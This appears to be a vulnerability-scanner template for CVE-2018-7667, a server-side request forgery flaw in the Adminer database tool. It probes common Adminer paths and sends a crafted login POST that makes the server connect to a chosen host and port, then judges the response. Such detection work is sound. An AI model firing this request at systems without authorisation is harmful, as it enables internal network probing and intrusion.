---
id: CVE-2018-7667
info:
  name: CVE-2018-7667
  author: Matt Galligan
  severity: Medium
  reference:
    - https://www.cvedetails.com/cve/CVE-2018-7667/
    - https://github.com/advisories/GHSA-43f8-p5w3-5m25
  tags: cve,2018,adminer
variables:
  server: 127.0.0.1
  port: "24"
  user: "foobar"
requests:
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        auth%5Bdriver%5D=server&auth%5Bserver%5D={{server}}:{{port}}&auth%5Busername%5D={{user}}   
    payloads:
      path:
        - "{{BaseURL}}/"
        - "{{BaseURL}}/adminer/"
        - "{{BaseURL}}/adminer.php"
    stop-at-first-match: true
    host-redirects: true
    cookie-reuse: true
    req-condition: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200
          - contains(body_1,'Adminer')
          - status_code_2 == 403
          - "!contains(body_2, 'Connecting to privileged ports is not allowed.')
            && contains(body_2, 'Adminer')"
        condition: and
